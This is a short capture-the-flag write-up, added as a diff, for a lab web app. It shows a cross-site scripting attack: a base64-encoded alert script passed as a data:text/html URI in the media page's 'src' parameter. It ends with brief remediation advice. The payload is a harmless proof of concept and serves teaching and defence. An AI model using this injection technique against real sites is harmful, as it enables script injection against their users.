@@ -1,0 +1,16 @@
+LOCATION : the clickable NSA image in the home page
+
+on the home page we click on the NSA icon to go to this URL: http://192.168.X.X/?page=media&src=nsa
+we encode in base64 a simple js code:
+Tool : https://www.base64decode.org/
+input : `<script>alert('42')</script>`
+output : `PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pg==`
+then we put the result and the data uri header in the url like this:
+
+http://192.168.x.x/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pg==
+then we got the flag.
+
+How to secure:
+ensure all data is filtered before return anything back to the user, such as the values of query parameters during searches.
+check the the type of the encoded  thing either data:image or plain text or html ....
+redirect invalid requests.
